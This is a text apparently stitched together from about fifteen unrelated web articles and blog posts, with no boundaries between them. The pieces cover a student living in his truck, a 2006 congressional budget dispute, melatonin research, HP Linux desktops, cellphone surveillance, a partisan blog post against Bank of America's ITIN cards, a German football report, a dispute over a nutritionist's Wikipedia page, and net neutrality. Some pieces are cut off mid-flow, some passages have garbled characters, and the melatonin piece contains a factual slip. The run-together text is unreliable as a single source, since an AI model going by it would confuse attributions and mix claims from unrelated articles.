It took an average of 17 months for programs to be shown in Australia after first airing overseas , a gap that has only increased over the past two years , the study found .
The findings were based on a " representative sample of 119 current or recent free - to - air TV series or specials " , said Malik , who is in the final stages of a PhD in law at the University of Technology Sydney .

The
Home Front
After a long day of film classes , working at the Apple Store , rock climbing at the gym and finishing homework in the student union , Cal State Fullerton senior Andy Bussell heads home -- to a white Toyota Tacoma with a twin - size mattress in the truck bed , a camper shell for protection and black curtains for privacy .
The 26 - year - old has been living in his truck for nearly 19 months , skirting rules against sleeping in vehicles while otherwise living the life of a mainstream student .
What started out as a way to save some cash has turned into a journey of self - reliance and independence .
“ Even though I had a good job , I was tired of living paycheck to paycheck and not making any headway with my credit cards , ” he said .
“ I ’ve learned that I can push myself , break down my own boundaries .
I ’ve been able to learn that I can change and adapt to different kinds of situations . ”
The odyssey began in 2005 .
Bussell was working full time as a “ Mac genius ” at the Apple Store in Newport Beach , sharing a $ 1,600 - per- month apartment in Aliso Viejo .
He had racked up more than $ 10,000 in credit card debt and was struggling to pay for school and save money for a three - month road trip .
So on July 29 , 2005 , he started living in his truck , with the goal of lasting one year .

Co-workers created a pool on how long the truck life would last , with the longest prediction three months .
“ I ’ve beat that , ” he said .
“ Once you find a routine , it ’s actually really easy . ”
Most mornings , Bussell heads to the university gym to shower , shave and brush his teeth .
Then he heads to class , and later to work .
Evenings are often spent rock climbing or doing yoga , visiting friends or studying in the student union , which has wireless Internet access .
Then he heads back to the truck , which he parks in a variety of locations , and plays guitar , reads with a battery - powered headlamp or watches DVDs on his laptop .
There have been hiccups along the way -- less than two months after Bussell began living in his truck , he was ticketed by a Costa Mesa police officer , who told him it was illegal to sleep in a vehicle .
The citation cost him $ 177.50 , “ but when you have n’t paid rent for ... months , it ’s not that bad , ” he said .

His mail goes to a post office box .
What he misses most are a kitchen and a bathroom .
To deal with the former , he buys food such as yogurt and fruit in small quantities , and to deal with the latter , he takes advantage of public facilities .
On occasion , he has resorted to employing an empty Gatorade bottle .
“ It ’s handy being a guy , ” he said .
Bussell planned to end his time in the truck after completing a nearly three - month road trip last summer , visiting many national parks in the West .
But upon his return , he became busy with work and school , and has n’t had time to think about moving into permanent lodging .
The credit card debt , which was part of the reason for his decision to live in a vehicle , is nearly paid off .
Bussell ’s mother , Jill , a health plan auditor who lives in Northern California , has conflicted feelings about her son ’s choice of dwelling -- a mix of motherly worry and filial pride .

“ If it was your kid , what would you think ?
We do n’t want him in the truck , that ’s obvious , ” she said .
But “ he ’s a very determined human being .
The life experiences Andy ’s made have been just tremendous . ”
Some attribute Bussell ’s lifestyle to his childhood experiences backpacking and camping while growing up in South Lake Tahoe .
Steven Cuellar , 23 , met Bussell about two years ago while working at the Apple Store in Fashion Island .
When he learned about his friend ’s plans to live in a truck , he was stunned .
“ I thought it was a crazy , whacked - out idea , ” said Cuellar , who graduated from Cal State Fullerton in June .
“ At the same time , I know him , so I was like , I know he can do it .
He ’s all like outdoorsy ... and that ’s the perfect setup for a person who likes to be outdoors .
It ’s like camping 24 - 7 . ”

Bussell has attracted attention on campus , from fellow film students , who created a short documentary about him , and from the campus newspaper .
But he has long been an oddity among his peers .
He graduated two years early from high school yet has spent a decade in college , switching majors several times .
He graduates in the spring , and is awaiting responses to grad school applications .
He hopes to shoot travel pieces and nature documentaries , and plans to write a book about his experiences .
Postings on his blog , gotruckyourself.blogspot.com , will provide fodder .
“ I ’ve learned that I could set my mind to something and do it , ” he said .
“ I think I ’ve gained an appreciation for homelessness , in a way .
Mine is a choice , but I can appreciate it now .
I can understand what people are going through . ”
Still , to gain a further understanding , Bussell plans to live as a homeless person for a week before he graduates , carrying a backpack with his belongings and sleeping in the bushes of Cal State Fullerton .
“ There are so many things to do , and I ’ve got to do them all , ” he said .

Just 35 hours after they passed a $ 2.8 trillion budget for FY 2007 with zero Democratic votes , House Republicans ran into a wall : the division between appropriators and fiscal hawks in their own ranks .
Before a vote Friday on a veterans spending bill , Rep. Jeb Hensarling ( R ) of Texas rose to object to the first of some $ 500 million in military construction projects .
They were " pork projects wrapped in the American flag , " he said , and they violated the budget agreement .
The chair agreed with his procedural objection , and the project was out .
Soon , all 20 projects funded with " emergency " money had been dropped .
But as the GOP braces for fall elections that threaten its majority , rifts in its ranks are risky , especially when they involve cutting military projects during wartime .
GOP appropriators , defending the bill on the House floor , said the move by Representative Hensarling and his fellow conservatives on the Republican Study Committee ( RSC ) threatened " vital programs in the war on terrorism , " such as $ 50 million for the unmanned predator program .
The RSC is the largest caucus within the House Republican Party and is driving the debate over budget restraint .
" Please do n't tell us you support the troops , " said Rep. Ray LaHood ( R ) of Illinois , a member of the House Appropriations committee , shooting an angry glance toward the row of RSC members .
" Pick another bill , not this one , " he said .
The clash between fiscal conservatives and the " cardinals " on the appropriations committee flares in every budget and spending cycle .
But it 's been especially acute in this election year , as Republicans see their hold on the House at stake .
Standing alone , any one of the projects dropped from the $ 94 billion Military Quality of Life and Veterans Affairs FY 2007 Appropriations bill would n't start a row .
They include construction and maintenance of military facilities and housing .
Unlike the now - infamous " bridge to nowhere " in Alaska , which became an icon for efforts to rein in member - sponsored earmarks , or pork spending , the military construction projects had been vetted by the Department of Defense and the Office of Management and Budget .
None appeared extravagant .
' Emergency ' spending ?
But to come in under President Bush 's spending request , the Committee on Appropriations decided to classify these 20 projects as " emergency " projects , so they would not count against the bill 's spending cap .
Democrats on the committee described the move as " budget gimmickry . "
" None of these projects were unforeseen , " wrote Democrats Chet Edwards of Texas , Sam Farr of California , and David Obey of Wisconsin in additional views attached to the committee report .
They proposed paying for the projects by reducing the tax cut for people making more than $ 1 million a year by 1 percent , or about $ 1,400 .
The move failed in committee on a party - line vote .
But by the time the spending bill hit the floor of the House , GOP conservatives were also riled .
Faced with raising the debt limit for the fifth time in the Bush presidency to nearly $ 9.6 trillion , they see themselves winning skirmishes but losing the war against red ink .
" We passed a budget not 48 hours ago , and already this is an attempt to circumvent it .
We felt we should do something about it , " says Rep. Jeff Flake ( R ) of Arizona , a leading member of the RSC .
" The appropriators removed $ 500 million of funding for projects and declared it emergency spending , removing it from the caps .
Worse , they called it a ' bridge fund ' to the next [ defense ] supplemental .
They just do n't appreciate the irony , " he says , referring to the flap over the bridge to nowhere .
For the first time , the FY 2007 budget resolution included a $ 50 billion placeholder for war costs should additional supplemental funding be necessary .
To date , the nearly $ 400 billion for the wars in Iraq and Afghanistan have been mainly funded through off - budget emergency supplemental spending requests .
RSC conservatives want to see more of that spending accounted for in the annual budgets .
Even the White House objected to the use of war reserve funds for military construction projects .
" This funding should be used only for urgent construction directly related to the global war on terror , instead of funding regular construction projects related to long - term defense needs , " stated the Office of Management and Budget .
House appropriators insisted they were in line with White House policy .
" The administration requested a bridge .
All we did was provide flesh on it , " says John Scofield , a spokesman for Rep. Jerry Lewis ( R ) of California , who chairs the House Appropriations Committee .
Deeper deficits
Watchdog groups say that the Congress is on a track to ever - deeper deficits .
" What we have done in the last several years is decide we can cut taxes , fight two wars , increase homeland security , expand government entitlement benefits , and leave the bill to future generations , " says Ed Lorenzen , policy director for the Concord Coalition , a nonpartisan organization based in Arlington , Va. , that promotes fiscal responsibility .
" What makes all this worse is that we 're getting very close to the retirement of the babyboom generation , and we should be saving and making preparations to meet the obligations for Social Security and Medicare .
Instead , we 're doing the opposite , " he adds .
The GOP floor fight " demonstrates that the House needs new leadership , " says Rep. Harold Ford ( D ) of Tennessee .
The hormone melatonin , released by the pineal gland , plays a major role in determining the sleep cycle in humans .
The molecule is also an activator of the immune system , exerts a potent anti-oxidant effect in cells , and — of great interest to biogerontologists — has long ( though somewhat controversially ) been implicated in the determination of lifespan .
Recently , melatonin supplementation in rats was shown to slow age - related decline in the morphology and function of the skin ( see our earlier posting , Melatonin , mitochondria , and dermal aging ) .
Melatonin has also been proposed as a potential therapeutic agent against age - related diseases of the brain , and even against brain aging per se .
A detailed discussion of the relevant aspects of brain aging , along with a summary of studies demonstrating a beneficial effect of the compound on animal models neurological diseases such as Parkinson ’s and Alzheimer ’s , can be found in a recent review by Bondy and Sharman at UC - Irvine :
The events associated with brain aging are enumerated with emphasis on increased oxidative and inflammatory processes and on mitochondrial dysfunction .
Several of these factors are further increased in a wide range of overt age - related neurological diseases .
This generality has given impetus to concepts concerning similar therapeutic approaches common to a series of neurodegenerative disorders .
Animal and cell culture models of several such disorders have benefited from the application of melatonin .
The mechanisms underlying the neuroprotective properties of melatonin are likely to involve activation of specific melatonin receptors .
This can lead to modulation of transcription factors and consequent altered gene expression , resulting in enhancement of antioxidant enzymes and downregulation of basal levels of inflammation .
Melatonin has potential utility both in slowing normal brain aging and in treatment of neurodegenerative conditions .
This is reinforced by the low cost of melatonin and its very low toxic hazard .
The manuscript reviews the evidence for oxidative damage as a prominent feature of aging in the brain , address the evidence that inflammation plays a contributory role in age - related decline of the CNS , and describe the age - associated onset of mitochondrial dysfunction — which is itself caused by , and a further cause of , oxidative damage .
Despite the significance of oxidation in brain aging and neurodegeneration , the authors warn against the use of antioxidants as therapeutics , for two reasons : First , many anti-oxidants ( such as vitamin E ) are simply poorly bioavailable to the CNS , taking months of heavy supplementation before equilibrium is reached .
Second , many processes in the brain rely on oxidative molecules for signaling ; hence broad - spectrum antibiotics might interfere with specific pathways and therefore have deleterious side effects .
Melatonin appears to escape both criticisms .
The molecule is highly bioavailable to the CNS following oral administration .
Furthermore , while it is ( chemically speaking ) a potent antioxidant , it is present at concentrations far lower than many dietary antioxidants — picomolar opposed to high micromolar or millimolar .
For that matter , its levels are far lower than those of the oxidative species against which we might hope for protection .
It is thought to exert its antioxidant effects indirectly , via induction of anti-oxidant proteins that catalytically convert free radicals and reactive oxygen species ( ROS ) into harmless water ( and , as a bonus , have probably been evolutionarily selected not to interfere in cellular signaling pathways ) .
Thus , by activating cellular defenses , melatonin can ameliorate oxidative damage far beyond its capacity as a molecular radical scavenger .
Whether via its effects on oxidation , mitochondrial function or inflammation , melatonin has been shown to improve outcomes in animal models of neurological disease .
( If you ’re able to access the paper , the table summarizing the results is here ) .
Melatonin ’s effect on gene transcription is mediated by specific receptors , of which the human genome contains two ( MT1 / MTNR1A and MT2 / MTNR1B ) .
Interestingly , the FDA recently approved a melatonin receptor agonist for use as a sleep aid .
The drug , ramelteon , is marketed as Rozerem ( via an incomprehensible campaign involving Abraham Lincoln and a beaver ) .
Intriguing possibility :
If melatonin exerts its effects against brain aging via these receptors , it means that a pharmaceutical with potential as an anti-aging therapeutic has already been subjected to trials and approved for daily use .
( Can you say “ off - label prescription “ ? )
I ’m sleeping easier already .
" We are involved in a number of massive deals for Linux desktops , and those are the kinds of things that are indicators of critical mass .
So we are really looking at it very hard , " said Doug Small , worldwide director of open source and Linux marketing at HP .
" We are in a massive deal right now for ... multi-thousands of units of a desktop opportunity for Linux .
That 's an indicator . "
He declined to give details about the Linux deals .
Though HP does n't offer a specific SKU of a notebook or desktop PC preloaded with Linux , several of its notebooks are certified to work with Novell 's SUSE Linux Enterprise Desktop 10 operating system and with Red Hat Linux .
The Palo Alto , Calif. , IT giant also provides Linux - loaded PCs for custom orders , such as large enterprise deals .
HP has preloaded PCs with Linux in previous years , but the market acceptance was n't there to do that on a broader scale , according to Small .
" Frankly , we did that in the past and did n't see the results for it , " he said .
While no tier - one vendor currently provides a factory - loaded SKU of Linux desktops or notebooks , the marketplace chatter is increasing .
Besides HP 's custom Linux PC orders and overall rising interest in desktop Linux , Lenovo certifies some of its systems for SLED 10 , and Dell said it 's poised to do the same .
Just days after launching an online suggestion Web site for customers , tens of thousands of people wrote to Dell saying that the company should provide Linux as a PC preload .
Robert Brentson , CEO of InTech Solutions , a Penfield , N.Y. - based solution provider and HP and Novell partner , agreed that the Linux PC segment is reaching an inflection point .
He pointed to integrated SUSE Linux Enterprise Server for ProLiant and BladeSystem servers and suggested that " at the desktop , I do think you 're going to see a similar amount of support as well . "
Brentson said stumbling blocks to Linux on the enterprise desktop -- particularly in the education space -- have been the availability of support training and end - user training plus the deployment of technology such as Novell 's ZENworks Desktop Management .
Brentson said his firm , a Novell certified Gold partner , is on track to begin providing such training and consulting in the near term .
Small said HP 's delivery of enterprise Linux to the channel now includes a focus on blade solutions .
" Because of the affinity for Linux and blades , we are spending a lot of energy focusing on that area and are developing a lot of programs we 'll be rolling out to channel partners during this year to educate them , to work with them and to maximize this opportunity in building solutions , " Small said .
He added that HP also plans some enhancements to its channel programs to help in the delivery of Linux solutions , but he did n't give details .
Your cellphone is more powerful than you probably know Your cellphone is an amazing device — perhaps more amazing than you realize .
It 's got all sorts of features , and I 'm not talking about playing music or shooting videos .
We keep learning about our phones ' undocumented features , and the ways they can be used to help or hurt us .
Back in January , for example , when Jason Cochran 's car was stolen from outside his home in Eastvale , Calif. , with his 10 - month - old son in it , Sprint was able to track it through the phone 's GPS unit .
Unfortunately , the comapny refused to disclose the car 's location to deputies without their filling out forms and paying a $ 25 fee .
( Despite Sprint 's refusal to help locate the boy , he was soon found unharmed . )
More recently , during the search for Jerry Cooke , Brian Hall , and Kelly James — the hikers who became trapped on Mount Hood — one of the early hopeful signs came from T - Mobile , James 's cellphone provider .
It detected his phone turning on and off , although he was apparently unable to make a call .
At the time , it was a sign that he was at least alive and trying to send a message .
That your cellphone company detects your signal even if you are n't making a call is pretty obvious , of course .
The network needs to know where you are in order to route your calls .
If the authorities are looking for you ( for good or bad ) , simply turning on your phone could clue them in to your location .
And , of course , let 's not forget the staple of many a cop show and science - fiction movie : triangulation .
It 's true .
If you 're using your phone , you can be tracked by measuring the strength of your signal at different locations .
Celebrated hacker Kevin Mitnick was captured in 1995 in just that fashion , and Verizon Wireless uses it to supplement the GPS for its VZ Navigator service .
All of these are somewhat obvious , if undocumented , features of your cellphone .
But we learned earlier this month that there are some other tricks your phone is capable of — and not simply telling the repair guys that you 've gotten it wet .
Working with Nextel , we learned , the FBI was able to turn a suspected Mafia member 's cellphone into a listening device , although the phone was n't even turned on .
Nextel sent it a signal ( presumably when it was on ) , and suddenly the phones of John Ardito and his attorney became bugs .
In this case , the government went through the trouble of getting a warrant for the procedure , though we 've learned how much the current Administration hates dealing with those pesky civil liberties .
That 's not the only way the government can use your phone against you .
It does n't need a warrant to demand that your cell - phone provider tell it where you 've been — and thanks to the Patriot Act , your provider can be prohibited from telling you its turned over that information .
That 's because in December 2005 , a federal judge ruled that the government can track citizens ' locations via their cellphones without probable cause .
Ain't that dandy .
Naturally , the government said that this technology would only be used against bad guys ... or people it thinks might be bad guys .
Or people it thinks could someday be bad guys .
It 's not like it has a history of abusing its powers or anything .
Like most people , I suspect , I had n't considered that a turned - off phone could be used to listen to me .
( Note to self : Remove batteries before discussing you - kn0w - what with you - know - who . )
And I would have liked to believe the Feds would require some oversight before demanding to know where I am at any moment .
But things , we 're told , are different now .
It 's for our own good .
If all this does n't give you pause , consider this :
Your phone most likely has a lithium - ion battery — the same kind that was catching fire in all those laptops .
A special circuit keeps them from overheating and , potentially , exploding .
I wonder if that circuit can be disabled with a remote command .
Have a nice day .
America prevails .

His column appears Fridays on USATODAY.com .
Bank of America is currently offering credit cards to residents of Los Angeles County who only have ITIN numbers and who do n't have either a social security number or a credit history .
That strongly implies that those credit recipients are illegal aliens .
Later this year the bank hopes to expand the program nationwide .
For those who do n't understand why this is horrifically bad , this bank is indirectly profiting from unlawful activity .
And , they 're explicitly going after that market .
If you 're one of those people who do n't agree this is bad , imagine some form of illegal activity that you believe is bad for society .
Then , imagine BofA going after that market .
And , the bank could n't do this if they knew the government was n't going to turn a blind eye to it .
And , the bank no doubt donates to political candidates , and they will almost certainly only donate to politicians who will help the bank make more money .
Let 's imagine that a few years from now BofA is making a handsome profit from this card .
Then , some politician proposes forbidding banks from engaging in this practice .
Do you think BofA is going to just let some politician cut off the money flow ?
Is n't it more likely that they 're going to donate to those politicians who'll allow more illegal immigration and who'll support companies trying to profit from that indirect illegal activity ?
( A tangible example : when Tom Tancredo merely suggested taxing remittances , Western Union / First Data began publicly supporting - and funding - his Democratic opponent ) .
In summary , Bank of " America " 's actions rely on and will lead to political corruption .
And , the bank would not do this if the Bush administration were not completely corrupt .
As for what you can do about this :
- Hopefully , BofA will eventually face both civil suits and criminal prosecutions for their scheme , and that might have a serious impact on their stock price .
If you 're a shareholder , express your concern .
Even better , if you belong to a pension plan that invests in the bank , express your concern to the manager of the plan , and tell others to do the same .
- Watch for news reports and editorials concerning the card , and write letters to the ombudsman or editor , or leave comments .
- Contact your representatives and urge them to remove any loopholes that allow banks to engage in this activity or to investigate their activites .
- If you have any business with BofA , transfer it to some other bank ; make sure they do n't have a similar policy on ITIN numbers or Matricula Consular cards first .
- Stop supporting anyone linked to the Bush administration .

UPDATE : An unconfirmed comment here says :
All of you Bank of America customers call the number on the back of your ATM cards and push ZERO to speak to a customer service representative .
Then ask to fill out a voice of the customer form .
The representative will enter your comments and it will get mailed to the quality assurance & customer satisfaction department .
The bank takes these forms very seriously .
Lodge your complaint and make your voice ring loud and proud to Bank of America President Ken Lewis .
UPDATE 2 : According to this :
[ Bank of America ] executives said participants needed another form of identification , such as ID cards issued by foreign consulates .
In Mexico 's case , that refers to the Matricula Consular card .
In 2004 , the Bush administration twisted arms to allow banks to accept that card as identification , despite both the FBI and the DHS admitting that the card was a security risk .

Ousmane Dembélés Skandal - Akte ist um eine Geschichte reicher !
Der 23 - Jährige kam zum wiederholten Male zu spät zum Training des FC Barcelona .
Seit seinem 138 - Millionen - Euro - Wechsel von Borussia Dortmund zu den Katalanen sorgt der französische Weltmeister für mehr Schlagzeilen neben als auf dem Platz .
Werde Deutschlands Tippkönig !
Jetzt zum SPORT1 Tippspiel anmeldenDie spanische Zeitung AS berichtet nun , dass Dembélé am Montag erst um 10.15 Uhr zum Training in der Ciutat Esportiva Joan Gamper erschien .
Die Motivation und Pünktlichkeit des Offensiv - Stars ließen nicht zum ersten Mal zu wünschen übrig .
Der Franzose kam schon mehrmals zu spät zum Training oder zu Treffpunkten vor Spielen .
Eskapaden und Verletzungen hemmen Ex-BVB-StarFrankreichs Nationaltrainer Didier Deschamps sagte über Dembélé unverblümt , dass er " die Angewohnheit habe , gerne mal zu spät zu kommen .
Egal ob bei seinem Verein oder bei der Nationalmannschaft .
Seine Ausreden sind mir bekannt .
" Barca - Legende Gerard Piqué dagegen versuchte seinem jungen Mitspieler zu helfen und nicht hängen zu lassen : " Wir müssen Dembélé dabei helfen , zu verstehen , dass der Fußball 24 Stunden am Tag ist .
" Doch davon ist allem Anschein nicht viel beim 23 - Jährigen hängengeblieben .
Neben nächtelangen Playstation - Sessions , Verspätungen , falscher Ernährung , zahlreichen Verletzungen – nur 75 Einsätze seit 2017 - und einer Fast - Prügelei mit Ex-Coach Ernesto Valverde mehren sich nun die Gerüchte , dass der Stürmer erneut einen Transfer provozieren könnte .
Nachdem sich Dembélé bereits von Stade Rennes und vom BVB wegstreikte , fällt in den Medien immer wieder der Name Manchester United .
Die Red Devils sollen den französischen Flügelflitzer als Alternative zu Jadon Sancho auf dem Zettel haben .
ManUnited sieht Dembélé als Sancho - AlternativeUnited - Coach Ole Gunnar Solskjaer drängt schon länger auf eine Verstärkung für die offensive Außenbahn , doch die Borussia lässt Sancho nicht unter 120 Millionen Euro ziehen .
Duncan Castles geht deshalb von einem Dembélé - Transfer nach Old Trafford aus , wie er im Podcast The Transfer Window verriet : " Mir wurde gesagt , dass es einen Kontakt zwischen United und Dembele 's Agenten gegeben hat .
Im Grunde genommen sucht United nach einer relativ günstigen Lösung und wollen von den finanziellen Probleme Barcelonas profitieren .
" Manchester hat noch bis zum 5 .
Oktober Zeit den zweiten Deal nach Donny van de Beek unter Dach und Fach zu bringen , ehe das Transferfenster schließt .
Doch ob Dembélé die erhoffte Verstärkung sein wird , bleibt abzuwarten .
Manchmal aber bewirken Tapetenwechsel auch Wunder - vielleicht auch beim einstigen Wunderkind aus Frankreich .
Patrick Holford has now solicited his subscribers to write positively about him on his wikipedia page , in a mailout earlier today :
“ Weirdness on Wikipedia – Ideally , debates on issues of scientific and medical contention should stick to the facts , but unfortunately those in the front line of paradigm shifts are usually subject to personal attacks , of which I ’ve had many .
I noticed a few on Wikipedia , which is meant to be the ‘ people ’s encyclopedia ’ meaning that anyone can edit an entry .
Unfortunately , some of the people who have been editing appear to be part of the pro-drug lobby .
I did write to the moderator to straighten out some facts , but have had no reply , so I ’ve decided to stay out of it .
Of course , if you think there ’s anything said that is wrong , or anything you ’d like to add , feel free to do so . ”
I think that means it ’s likely to be vandalised on and off for a good long while to come .
I ’m perfectly serious when I say I do n’t think it ’s appropriate for readers of this to get involved .
en.wikipedia.org/w/index.php?title=Patrick_Holford&oldid=108648937
As you can see , Holford ’s wikipedia page is currently about a third full of material he has written attacking me , of all things .
I ’ve only written on his science ( and now his wikipedia shenanigans ) .
I can understand it must be difficult to see yourself criticised on wikipedia and it can be a very imperfect medium , but I do wonder about this move , again .
Ah , his free - and - easy approach to scientific evidence is also excellently exposed in extremis here for those who are interested .
The copy - and - paste post onto his wikipedia page comes from an earlier mailout to his subscribers today , although we ca n’t know who posted it on wikipedia , unlike before ( also reported in Wikipedia ’s in - house newspaper ) .
The rather personal style of the attack on his critics , as a kind of bullying , is quite interesting .
A vitamin salesman himself , he slurs his critics by suggesting they are “ pro-drug ” and motivated by an interest in the pharmaceutical industry ; and as an enthusiastic amateur with no qualifications , he opines that his critics are insufficiently highly qualified to judge him .
This issue of arguing from authority is one Iâ€™ve addressed at length elsewhere ( eg Donâ€™t Dumb Me Down ) and itâ€™s one of the things that motivated me to engage with the communication of science in the media as a hobby : to me , this is about the evidence .
A schoolkid can spot that Holford ’s quoted studies of cells in dishes do not justify his claim that vitamin C is more effective than AZT , and that ’s very empowering .
People do have to be in full possession of the facts to make judgements , though , and this is the other interesting feature of he â€œinformation managementâ€ strategy in Holford ’s post .
He links to his online response to my BMJ article ( Holford calls it his “ letter published in the BMJ ” , although I checked the print version , and Iâ€™m afraid I couldnâ€™t find it , so I do n’t think they did – the bar for online responses in the BMJ is admirably very low , they almost allow anything that is not obscene ) .
Interestingly , he does n’t link to the BMJ site to show his subscribers his response , even though – correct me if I ’m wrong – that page is free to access for all ( hurrah ! ) .
Instead , he has gone to special effort , and made a whole new page on his own website , where he has placed his response in isolation .
The consequence of this is that his subscribers â€ “ who may be interested in reading different views – are deprived of seeing the context , deprived of seeing my article ( which is neither here nor there really ) : but crucially , they are deprived of seeing the responses to his online posting , in which his reasoning is criticised in some detail as being characteristic of the nutritionism genre .
If you are interested in the full caboodle , as it were , there is nothing to hide : you can read my article , his responses , and all the others , online here in the BMJ , in full .
In any case it seems he ’s riled , and I ’m very sorry to see that .
I only really noticed him on account of my longstanding interest in HIV denialism and vitamin pushers in South Africa , and I really would n’t think any less of him if he just said that , well , he now does n’t really think that vitamin C is better than the antiretroviral AZT .
I was also rather hoping to have him on the podcast interviews ( alongside gods like Sokal ) as one of the more articulate – if obscure – of the unqualified media nutritionists , but sadly he declined , unless it could be an opportunity to specifically promote his new book .
Ho hum .
If I could ask the folks in Microsoft to do me one favor , it would be to eliminate the percent complete display of a task as it is a ridiculous metric ... Tasks have only three states : not started , started but not finished and finished .
Period .
Why can't enterprise architects make this form of stupidity go away that the notion of a task is 74.2 % complete ?
It is reasonable to ask for an estimate of the remaining ( uninterrupted ) time to complete a task .
Likewise , if your boss compells you to publish metrics then why not do something with more integrity such as percentage of use cases that pass acceptance tests ?
The myth is that the amount of work remaining can be determined by a simple calculation of the total work minus the work done .
However , it 's often the case that after working for 10 days , you may predict you will take 10 more days , but in fact you may have done much less or much more than half the total work required .
Those 25 use cases are unlikely to all require exactly the same effort , so it 's a myth to believe that the time taken to complete 10 use cases to acceptance tests is 40 % of the total time it will take to complete all 25 .
The 40 % is a mathematical fiction .
I guess we should all walk around drinking our own urine so that we can encourage folks to state that they are 90 % complete which happens to be the most chosen random number for percent complete .
I bet if you look at some of the projects within your organization , it would n't be too difficult to find it ..
Residents in east Belfast have been " living in a horror movie " for more than a month after an invasion of fearless giant rats .
Kids have been dragged off the streets by fearful parents and a dog attacked by the invading rodents - believed to have been displaced from their former abode when transport outfit Translink did work on a nearby railway line .
June Brown , a worker at the local community centre in which she was presumably barricaded in a Dawn of the Dead stylee , told the BBC : " We see rats daily .
One of the mothers was coming to the mother - and - toddlers and a rat came out and walked alongside her pram .
The baby was actually delighted to see this furry friend .
She did not want to react in case she frightened the child . "
Her shaken colleagues Gail Leemer and Jane Ormer added : " They are like cats .
They are stone deaf , they fly up and down the road and play tig with the buses .
They come out in daylight .
Nothing seems to scare them .
If a bus was coming , the rat would just dilly dally along the road .
Nothing seems to deter them .
They do n't seem to be frightened of human people . "
The council has reportedly put down poison in an attempt to purge the streets of mutant rats , but in the circumstances and given the traumatised locals ' description of the hell rodents , nuke - bearing stealth aircraft might be a better bet . ®
John de Ruiter has been known to sit on stage , gaze out at his flock and say nothing for hours .
When he does speak , long gaps of silence often separate his sentences .
Sometimes , when he takes questions , the self - proclaimed " living embodiment of the truth " will answer with nothing more than a silent , stone - faced stare .
For more than a decade , de Ruiter 's taciturn ways have managed to attract thousands of people from around the world to join his religious movement .
A University of Alberta researcher has been exploring why de Ruiter 's silent approach has been so successful .
Paul Joosse , a PhD student in the U of A Department of Sociology , has concluded that interpersonal silence effectively asserts de Ruiter 's charismatic authority over his followers in three ways .
He recently presented his findings at the Society for the Scientific Study of Religion annual conference in Portland , Oregon , and his research is published this month in the Journal of Contemporary Religion .
Joosse believes de Ruiter 's silence allows his followers to project their own " highly personalized " meaning into the answers they receive from him .
Joosse noted that de Ruiter 's followers often have a history of participation in various alternative religious movements before they settle into the de Ruiter group and are therefore more likely than most to find meaning in the vague messages that de Ruiter is known to express .
The Canada - based De Ruiter also uses silence as a punitive tool and a means to discourage dissent , Joosse said , adding that the effect is similar to the way the Amish , at times , shun non-conformists in their group .
However , one crucial difference is that the Amish employ the silent treatment collectively , while de Ruiter , the irreplaceable , exclusive authority figure in his group , uses it unilaterally .
As an example , in 1999 at a group meeting , de Ruiter 's ex-wife confronted de Ruiter about his adulterous relationships with two female devotees , who were sisters .
According to various accounts , de Ruiter glared at her in response , essentially remaining mute .
" That de Ruiter still retained a large following after that episode speaks to the charismatic sway that he continues to exercise over his devotees , " said Joosse , who has conducted interviews and analyzed the group 's various communications material , such as video - taped meetings , which are for sale through the group 's website .
The third function of de Ruiter 's silence is that it accelerates the formation of intimate bonds between de Ruiter and his followers , especially when he combines it with extended eye contact .
Joosse added that many of de Ruiter 's followers - - a good number of whom are middle - aged females -- see de Ruiter as possessing " a mysterious aura " .
In his article , Joosse wrote , " Silence is inappropriate on a first date or at a gathering of previously unacquainted people ... [ But ] the cultivation of silence by the de Ruiter group permits a type of interaction that is usually exclusive to new lovers -- deep , silent gazing into one another 's eyes .
Strangers to de Ruiter find themselves locked in an intimate gaze , and it is not surprising that [ they ] confuse the act that usually accompanies intimacy with actual intimacy . "
Joosse believes that de Ruiter , by keeping his mouth shut , has found an easily replicable method that works on a number of levels to captivate his followers .
" When people follow a charismatic leader , the existence of the group depends upon the continued belief that their leader is somehow extraordinary or even superhuman , " Joosse said .
" Therefore , the leader must continually prove himself to his followers , and de Ruiter is able to achieve this simply by remaining silent . "

AT&T and BellSouth Have Already Said So
I ’m not political .
I do n’t ask people to do things for causes .
This not a cause .
This is an emergency .
The merger was almost approved this week .
The AT&T - BellSouth merger hands over incredible power .
THE MERGER ESTABLISHES A A DE FACTO MA BELL DSL MONOPOLY IN 23 STATES , that is to say new enterprise would be the principal or the only provider available .
The Judiciary Committee has already approved the deal , avoiding a court review .
The FCC came close to letting it go through this week , but postponed their response at the last minute , because of letters from people like us .
We ’ve got about two weeks to stop what they ’ve already said they will do .
According to the Washington Post : William L. Smith , chief technology officer for Atlanta - based BellSouth Corp. , told reporters and analysts that an Internet service provider such as his firm should be able , for example , to charge Yahoo Inc. for the opportunity to have its search site load faster than that of Google Inc .
He ’s not alone .
Ed Whitacre of AT&T told Business
Week last fall :
Now what they would like to do is use my pipes free , but I ai n’t going to let them do that because we have spent this capital and we have to have a return on it .
So there ’s going to have to be some mechanism for these people who use these pipes to pay for the portion they ’re using .
Why should they be allowed to use my pipes ? [ via Savetheinternet.com ]
Sir Tim Berners - Lee said the following in the New YorkTimes article “ NeutralityÃ¢â¬â ¢
Is New Challenge for Internet Pioneer an Interview on Net Neutrality with Sir Tim Berners - Lee ” By JOHN MARKOFF Published : September 27 , 2006 .
. . . if the United States ends up faltering in its quest for Net neutrality , I think the rest of the world will be horrified , and there will be very strong pressure from other countries who will become a world separate from the U.S. , where the Net is neutral .
If things go wrong in the States , then I think the result could be that the United States would then have a less - competitive market where content providers could provide a limited selection of all the same old movies to their customers because they have a captive market .
Meanwhile , in other countries , youÃ¢â¬â¢d get a much more dynamic and much more competitive market for television over the Internet .
So that youÃ¢â¬â¢d end up finding that the U.S. would then fall behind and become less competitive until they saw what was going on and fixed it .
I just hope we donÃ¢â¬â¢t have to go through a dark period , a little dark ages while people experiment with dropping Net neutrality and then , perhaps , put it back .
Tell the FCC Net Neutrality Is Not Negotiable
Since Wednesday , when the Department of Justice gave their blessing to the AT&T BellSouth merger , more than 20,000 people sent letters to the FCC asking for a Net Neutrality condition to be written into the merger .
freepress.com says this above the letter .
Do n’t Let Ma Bell Monopolize the Internet
The AT&T and BellSouth merger would resurrect the Ma Bell monopoly that ruled communications for decades .
But this new corporate behemoth would no longer control just phone calls .
The new AT&T wants to become gatekeepers to all digital media — television , telephone and Internet — at the expense of the free and open Internet that so many Americans rely upon .

About the book Buy the book Chapter 11 : “ Creation Science ” 2.0
The following excerpt contains an update not found in the original hardcover edition .
